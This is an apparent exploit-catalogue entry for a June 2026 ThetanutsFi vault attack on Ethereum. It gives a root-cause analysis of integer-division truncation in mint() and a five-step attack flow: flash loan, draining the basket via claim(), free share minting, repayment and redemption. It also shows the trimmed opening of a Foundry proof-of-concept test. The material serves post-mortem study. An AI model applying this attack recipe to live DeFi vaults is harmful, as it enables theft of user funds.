# [?] ThetanutsFi exploit (2026-06)

## Summary
Severity: Unknown
Chain: Ethereum
Component: ThetanutsFi
Published: 2026-06
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-06/ThetanutsFi_exp.sol
Type: defi-exploit-poc

## Details
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import "../interface.sol";

// @KeyInfo - Total Lost : ~$2.1M (rescued ~$2M by whitehat)
// Attacker : 0x30498e4466789E534c72e03B52A16c978655b41e
// Attack Contract : 0xa589c5342068B0C1fEFd44d3c95354427502AC91
// Vulnerable Contract : 0xC2C3AE0a7b405058558C9b4a63b373486CB86Ac7 (TN-IDX-USDC-PUT Legacy Vault)
// Attack Tx : 0xbba9f138fe39503bfd1aa62932dbd6ab35d37d23d48e4b7bf2988a9d5dc39fec
// Attack date : June 15, 2026  Chain: Ethereum  Block: 25323329
// @Analysis
// Post-mortem : https://x.com/ThetanutsFi/status/2066569315961454925
// Alert : https://x.com/AstraSec_AI (AstraSec)
//
// Root Cause: Integer division truncation in mint() after the vault was drained to a near-zero totalSupply.
//   share/deposit required to mint = vaultBasketBalance * amount / totalSupply
//   Once totalSupply is crushed to 3 wei (and the residual basket backing is ~1 wei), that division
//   floors to 0 for any `amount < totalSupply`, so the attacker can mint shares without depositing assets.
//
// Attack flow (reproduced in full below):
//   1. Flash-loan (totalSupply - 3) TN-IDX-USDC-PUT shares from the Aave-style pool that holds them.
//   2. claim() those shares -> burns them, draining the vault's basket of underlying option tokens to the
//      attacker and leaving totalSupply == 3.
//   3. Repeatedly mint() shares for free (each deposit truncates to 0), doubling the supply until the
//      attacker holds enough shares to repay the flash loan + premium.
//   4. Repay the flash loan with freshly-minted (worthless) shares, keeping the entire basket.
//   5. Redeem the basket option tokens (initWithdraw) for USDC -> realized profit.

interface IThetaVault {
    function totalSupply() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function claim(uint256 amount) external;
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-06/ThetanutsFi_exp.sol_
